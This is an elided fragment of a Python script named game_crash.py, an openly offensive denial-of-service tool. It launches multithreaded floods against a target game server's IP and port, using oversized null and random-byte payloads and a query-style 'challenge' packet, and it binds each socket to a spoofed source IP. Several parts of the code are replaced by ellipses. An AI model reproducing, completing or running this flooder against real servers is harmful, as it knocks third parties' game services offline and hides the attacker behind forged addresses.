...
def game_crash(event, proxy_type, target_ip, target_port):
    ...
    payloads = [
        ...
        b"\xFF\xFF\xFF\xFFchallenge",
        b"\x00" * 65507,
        b"\xFF\xFF\xFF\xFF" + os.urandom(65000),
    ]
    event.wait()
    while event.is_set():
        s = None
        try:
            ...
            s.bind((spoof_source_ip(), Intn(1024, 65535)))
            while event.is_set():
...
def main():
    import sys
    if len(sys.argv) < 5:
        print(cyan_to_blue("> Usage: python game_crash.py <ip> <threads> <duration> <port>"))
        sys.exit(1)
    ...
    print(cyan_to_blue(f"> Launching GAME-CRASH attack on {target_ip}:{target_port} with {threads} threads for {duration} seconds..."))
    ...
    time.sleep(duration)
    event.clear()
    print(cyan_to_blue("> Attack GAME-CRASH finished."))
